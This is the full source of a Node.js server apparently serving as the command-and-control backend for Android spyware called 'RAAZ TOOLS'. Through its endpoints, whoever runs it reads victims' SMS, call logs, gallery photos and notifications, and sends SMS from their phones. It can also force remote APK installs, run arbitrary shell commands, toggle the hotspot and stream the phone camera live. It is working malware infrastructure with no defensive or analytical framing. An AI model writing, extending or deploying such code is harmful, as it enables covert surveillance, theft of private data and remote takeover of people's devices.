// ╔══════════════════════════════════════════════════════════════╗
// ║         RAAZ TOOLS - SERVER v4.1 (Render Deploy)            ║
// ║  SMS (latest 10), Calls, Gallery, APK Auto, Notifications,  ║
// ║  SIM, Battery, Toast, Live Camera, Shell CMD, Hotspot       ║
// ╚══════════════════════════════════════════════════════════════╝

const express = require('express');
const admin   = require('firebase-admin');
const http    = require('http');
const app     = express();
const PORT    = process.env.PORT || 3000;

// ─── Firebase Init ────────────────────────────────────────────────────────────
const serviceAccount = require('./serviceAccountKey.json');
admin.initializeApp({
  credential:  admin.credential.cert(serviceAccount),
  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com' // <-- REPLACE
});
const db = admin.database();

app.use(express.json({ limit: '100mb' }));
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// ─── Camera MJPEG clients store ───────────────────────────────────────────────
const cameraClients = {}; // deviceId → Set<res>

// ─── Helper: Wait for Firebase response ──────────────────────────────────────
function waitForResponse(deviceId, requestType, requestId, timeout = 20000) {
  const responseRef = db.ref(`responses/${deviceId}/${requestType}`);
  return new Promise((resolve, reject) => {
    let done = false;
    const listener = responseRef.on('value', snap => {
      if (!done && snap.exists()) {
        const data = snap.val();
        if (data && data.requestId === requestId) {
          done = true;
          clearTimeout(timer);
          responseRef.off('value', listener);
          responseRef.remove();
          resolve(data);
        }
      }
    });
    const timer = setTimeout(() => {
      if (!done) {
        done = true;
        responseRef.off('value', listener);
        reject(new Error(`Timeout after ${timeout}ms`));
      }
    }, timeout);
  });
}

// ─── Helper: Push command ─────────────────────────────────────────────────────
async function pushCommand(deviceId, command, extra = {}) {
  const ref = db.ref(`commands/${deviceId}`).push();
  await ref.set({ command, ...extra, timestamp: admin.database.ServerValue.TIMESTAMP, status: 'pending' });
  return ref.key;
}

// ─── Helper: Push request ─────────────────────────────────────────────────────
async function pushRequest(deviceId, type, extra = {}) {
  const requestId = Date.now().toString();
  await db.ref(`requests/${deviceId}/${type}`).set({
    requestId, ...extra, timestamp: admin.database.ServerValue.TIMESTAMP
  });
  return requestId;
}

// ════════════════════════════════════════════════════════════════
//   ROOT
// ════════════════════════════════════════════════════════════════
app.get('/', (req, res) => {
  res.json({ status: '✅ RAAZ TOOLS v4.1', message: 'Hotspot control added, SMS latest only, WhatsApp removed' });
});

// ════════════════════════════════════════════════════════════════
//   DEVICE MANAGEMENT
// ════════════════════════════════════════════════════════════════
app.post('/api/register', async (req, res) => {
  const { deviceId, info } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  try {
    await db.ref(`onlineDevices/${deviceId}`).set({
      info: info || {}, lastSeen: admin.database.ServerValue.TIMESTAMP, online: true
    });
    res.json({ status: 'registered', deviceId });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/devices', async (req, res) => {
  try {
    const snapshot = await db.ref('onlineDevices').once('value');
    const devices = [];
    const now = Date.now();
    snapshot.forEach(child => {
      const d = child.val();
      if ((now - d.lastSeen) < 120000) {
        devices.push({ deviceId: child.key, info: d.info || {}, lastSeen: d.lastSeen });
      } else {
        child.ref.update({ online: false });
      }
    });
    res.json(devices);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/heartbeat', async (req, res) => {
  const { deviceId, info } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  try {
    await db.ref(`onlineDevices/${deviceId}`).update({
      lastSeen: admin.database.ServerValue.TIMESTAMP, online: true,
      ...(info ? { info } : {})
    });
    res.json({ status: 'alive' });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/device/:deviceId', async (req, res) => {
  try {
    await db.ref(`onlineDevices/${req.params.deviceId}`).remove();
    res.json({ status: 'removed' });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ════════════════════════════════════════════════════════════════
//   COMMANDS (generic + flashlight)
// ════════════════════════════════════════════════════════════════
app.post('/api/command', async (req, res) => {
  const { deviceId, command, extra } = req.body;
  if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
  try {
    const key = await pushCommand(deviceId, command, extra ? { extra } : {});
    res.json({ status: 'queued', key });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/flashlight', async (req, res) => {
  const { deviceId, state } = req.body;
  if (!deviceId || !state) return res.status(400).json({ error: 'deviceId and state required' });
  try {
    const key = await pushCommand(deviceId, `flashlight ${state}`);
    res.json({ status: 'queued', key });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ════════════════════════════════════════════════════════════════
//   BATTERY
// ════════════════════════════════════════════════════════════════
app.post('/api/battery', async (req, res) => {
  const { deviceId, level, charging } = req.body;
  if (!deviceId || level == null) return res.status(400).json({ error: 'Missing data' });
  try {
    await db.ref(`battery/${deviceId}`).push({
      level, charging: charging || false, timestamp: admin.database.ServerValue.TIMESTAMP
    });
    res.json({ status: 'logged' });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/battery/:deviceId', async (req, res) => {
  try {
    const snap = await db.ref(`battery/${req.params.deviceId}`).orderByKey().limitToLast(1).once('value');
    let latest = null;
    snap.forEach(child => { latest = { id: child.key, ...child.val() }; });
    res.json(latest || { level: 0, charging: false });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ════════════════════════════════════════════════════════════════
//   SMS READ (with limit for latest only)
// ════════════════════════════════════════════════════════════════
app.get('/api/sms/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const limit = parseInt(req.query.limit) || 10; // default to latest 10
  try {
    const requestId = await pushRequest(deviceId, 'sms', { limit });
    const response = await waitForResponse(deviceId, 'sms', requestId, 15000);
    res.json({ smsList: response.smsList || [] });
  } catch (e) { res.status(408).json({ error: e.message, smsList: [] }); }
});

// ════════════════════════════════════════════════════════════════
//   SMS SEND
// ════════════════════════════════════════════════════════════════
app.post('/api/sms/send', async (req, res) => {
  const { deviceId, to, message } = req.body;
  if (!deviceId || !to || !message)
    return res.status(400).json({ error: 'deviceId, to, message required' });
  try {
    const requestId = Date.now().toString();
    await db.ref(`requests/${deviceId}/sendSms`).set({
      requestId, to, message, timestamp: admin.database.ServerValue.TIMESTAMP
    });
    const result = await waitForResponse(deviceId, 'sendSms', requestId, 15000);
    res.json({ status: result.status || 'sent', result: result.result, requestId });
  } catch (e) { res.status(408).json({ error: e.message }); }
});

// ════════════════════════════════════════════════════════════════
//   CALL LOGS
// ════════════════════════════════════════════════════════════════
app.get('/api/calls/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  try {
    const requestId = await pushRequest(deviceId, 'calls');
    const response = await waitForResponse(deviceId, 'calls', requestId, 15000);
    res.json({ callList: response.callList || [] });
  } catch (e) { res.status(408).json({ error: e.message, callList: [] }); }
});

// ════════════════════════════════════════════════════════════════
//   GALLERY IMAGES
// ════════════════════════════════════════════════════════════════
app.get('/api/gallery/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const count = parseInt(req.query.count) || 5;
  try {
    const requestId = await pushRequest(deviceId, 'gallery', { count });
    const response = await waitForResponse(deviceId, 'gallery', requestId, 30000);
    res.json({ images: response.images || [] });
  } catch (e) { res.status(408).json({ error: e.message, images: [] }); }
});

// ════════════════════════════════════════════════════════════════
//   INSTALLED APPS
// ════════════════════════════════════════════════════════════════
app.get('/api/installedApps/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  try {
    const requestId = await pushRequest(deviceId, 'installedApps');
    const response = await waitForResponse(deviceId, 'installedApps', requestId, 15000);
    res.json({ apps: response.apps || [] });
  } catch (e) { res.status(408).json({ error: e.message, apps: [] }); }
});

// ════════════════════════════════════════════════════════════════
//   SIM INFO
// ════════════════════════════════════════════════════════════════
app.get('/api/simInfo/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  try {
    const requestId = await pushRequest(deviceId, 'simInfo');
    const response = await waitForResponse(deviceId, 'simInfo', requestId, 15000);
    res.json({ simList: response.simList || [] });
  } catch (e) { res.status(408).json({ error: e.message, simList: [] }); }
});

// ════════════════════════════════════════════════════════════════
//   APK AUTO DOWNLOAD + INSTALL
// ════════════════════════════════════════════════════════════════
app.post('/api/installApk', async (req, res) => {
  const { deviceId, url } = req.body;
  if (!deviceId || !url) return res.status(400).json({ error: 'deviceId and url required' });
  try {
    const requestId = await pushRequest(deviceId, 'installApk', { url, autoInstall: true });
    const response = await waitForResponse(deviceId, 'installApk', requestId, 90000);
    res.json({ status: 'success', result: response.result });
  } catch (e) {
    res.status(202).json({ status: 'queued', message: 'APK download started on device. Install prompt will appear.', error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   NOTIFICATIONS
// ════════════════════════════════════════════════════════════════
app.get('/api/notifications/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const limit = parseInt(req.query.limit) || 20;
  try {
    const snap = await db.ref(`notifications/${deviceId}`).orderByKey().limitToLast(limit).once('value');
    const notifs = [];
    snap.forEach(child => notifs.push({ id: child.key, ...child.val() }));
    res.json(notifs.reverse());
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/notification', async (req, res) => {
  const { deviceId, packageName, title, text, timestamp } = req.body;
  if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });
  try {
    await db.ref(`notifications/${deviceId}`).push({
      packageName, title: title || '', text: text || '',
      timestamp: timestamp || admin.database.ServerValue.TIMESTAMP
    });
    res.json({ status: 'logged' });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ════════════════════════════════════════════════════════════════
//   APP USAGE
// ════════════════════════════════════════════════════════════════
app.get('/api/usage/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const limit = parseInt(req.query.limit) || 20;
  try {
    const snap = await db.ref(`usage/${deviceId}`).orderByKey().limitToLast(limit).once('value');
    const usage = [];
    snap.forEach(child => usage.push({ id: child.key, ...child.val() }));
    res.json(usage.reverse());
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/usage', async (req, res) => {
  const { deviceId, packageName, appName } = req.body;
  if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });
  try {
    await db.ref(`usage/${deviceId}`).push({
      packageName, appName: appName || packageName,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });
    res.json({ status: 'logged' });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ════════════════════════════════════════════════════════════════
//   TOAST / LOCK SCREEN
// ════════════════════════════════════════════════════════════════
app.post('/api/toast', async (req, res) => {
  const { deviceId, message } = req.body;
  if (!deviceId || !message) return res.status(400).json({ error: 'deviceId and message required' });
  try {
    const key = await pushCommand(deviceId, 'showToast', { extra: message });
    res.json({ status: 'sent', key });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/dismissToast', async (req, res) => {
  const { deviceId } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  try {
    const key = await pushCommand(deviceId, 'dismissToast');
    res.json({ status: 'dismiss sent', key });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ════════════════════════════════════════════════════════════════
//   HOTSPOT CONTROL (NEW)
// ════════════════════════════════════════════════════════════════
// Turn hotspot on/off/toggle
app.post('/api/hotspot/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const { action } = req.body; // action = "on", "off", "toggle"
  if (!action || !['on','off','toggle'].includes(action))
    return res.status(400).json({ error: 'action must be "on", "off", or "toggle"' });
  try {
    const key = await pushCommand(deviceId, `hotspot ${action}`);
    res.json({ status: 'queued', key, action });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Get hotspot status (requires device to respond)
app.get('/api/hotspot/status/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  try {
    const requestId = await pushRequest(deviceId, 'hotspotStatus');
    const response = await waitForResponse(deviceId, 'hotspotStatus', requestId, 10000);
    res.json({ status: response.status || 'unknown', details: response.details || {} });
  } catch (e) { res.status(408).json({ error: e.message, status: 'unknown' }); }
});

// ════════════════════════════════════════════════════════════════
//   LIVE CAMERA — MJPEG Stream
// ════════════════════════════════════════════════════════════════
app.get('/api/camera/stream/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const camera = req.query.camera || 'back';

  res.writeHead(200, {
    'Content-Type':  'multipart/x-mixed-replace; boundary=RAAZFRAME',
    'Cache-Control': 'no-cache, no-store',
    'Connection':    'keep-alive',
    'Pragma':        'no-cache',
    'Access-Control-Allow-Origin': '*'
  });

  if (!cameraClients[deviceId]) cameraClients[deviceId] = new Set();
  cameraClients[deviceId].add(res);
  console.log(`📷 Viewer connected for ${deviceId} (${camera}) — total: ${cameraClients[deviceId].size}`);

  // Tell device to start camera streaming
  await pushCommand(deviceId, 'startCamera', { camera, intervalMs: 400 }).catch(() => {});

  req.on('close', async () => {
    if (cameraClients[deviceId]) {
      cameraClients[deviceId].delete(res);
      if (cameraClients[deviceId].size === 0) {
        delete cameraClients[deviceId];
        await pushCommand(deviceId, 'stopCamera').catch(() => {});
        console.log(`📷 All viewers disconnected for ${deviceId} — camera stopped`);
      }
    }
  });
});

app.post('/api/camera/frame', (req, res) => {
  const { deviceId, frameBase64 } = req.body;
  if (!deviceId || !frameBase64) return res.status(400).json({ error: 'Missing data' });

  const clients = cameraClients[deviceId];
  if (clients && clients.size > 0) {
    const frame = Buffer.from(frameBase64, 'base64');
    const header = `\r\n--RAAZFRAME\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.length}\r\n\r\n`;
    const toRemove = [];
    clients.forEach(clientRes => {
      try {
        clientRes.write(header);
        clientRes.write(frame);
      } catch (e) {
        toRemove.push(clientRes);
      }
    });
    toRemove.forEach(r => clients.delete(r));
    res.json({ status: 'ok', viewers: clients.size });
  } else {
    res.json({ status: 'no_viewers', viewers: 0 });
  }
});

app.get('/api/camera/snapshot/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const camera = req.query.camera || 'back';
  try {
    const requestId = await pushRequest(deviceId, 'snapshot', { camera });
    const response = await waitForResponse(deviceId, 'snapshot', requestId, 15000);
    if (response.imageBase64) {
      res.set('Content-Type', 'image/jpeg');
      res.send(Buffer.from(response.imageBase64, 'base64'));
    } else {
      res.status(500).json({ error: 'No image' });
    }
  } catch (e) { res.status(408).json({ error: e.message }); }
});

app.get('/view/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const camera = req.query.camera || 'back';
  res.send(`
  <!DOCTYPE html>
  <html>
  <head>
      <title>RAAZ Live Stream</title>
      <style>
          body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
          img { border: 2px solid #0f0; max-width: 100%; height: auto; }
      </style>
  </head>
  <body>
      <h2>📷 Live Camera Feed – ${deviceId}</h2>
      <img src="/api/camera/stream/${deviceId}?camera=${camera}" />
      <p>If stream doesn't appear, try <a href="/api/camera/stream/${deviceId}?camera=${camera}" target="_blank">direct MJPEG link</a>.</p>
  </body>
  </html>
  `);
});

// ════════════════════════════════════════════════════════════════
//   SHELL CMD
// ════════════════════════════════════════════════════════════════
app.post('/api/cmd', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
  try {
    const requestId = await pushRequest(deviceId, 'cmd', { command });
    const response = await waitForResponse(deviceId, 'cmd', requestId, 25000);
    res.json({ output: response.output || '', exitCode: response.exitCode || 0 });
  } catch (e) { res.status(408).json({ error: e.message, output: '' }); }
});

// ════════════════════════════════════════════════════════════════
//   CLEAR QUEUE
// ════════════════════════════════════════════════════════════════
app.delete('/api/clear/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  try {
    await Promise.all([
      db.ref(`commands/${deviceId}`).remove(),
      db.ref(`requests/${deviceId}`).remove(),
      db.ref(`responses/${deviceId}`).remove(),
      db.ref(`results/${deviceId}`).remove(),
    ]);
    res.json({ status: 'cleared', deviceId });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ════════════════════════════════════════════════════════════════
//   START
// ════════════════════════════════════════════════════════════════
const server = http.createServer(app);
server.listen(PORT, () => {
  console.log(`
╔══════════════════════════════════════════════════════╗
║   ✅ RAAZ TOOLS SERVER v4.1                         ║
║   🚀 Port     : ${PORT}                              ║
║   🔥 Hotspot  : ON/OFF/Toggle + Status              ║
║   📱 SMS      : Latest only (limit param)           ║
║   📷 Camera   : MJPEG Live Stream                    ║
║   🌐 HTML Viewer : /view/:deviceId                   ║
║   ⌨️ Shell CMD : /api/cmd                            ║
╚══════════════════════════════════════════════════════╝`);
});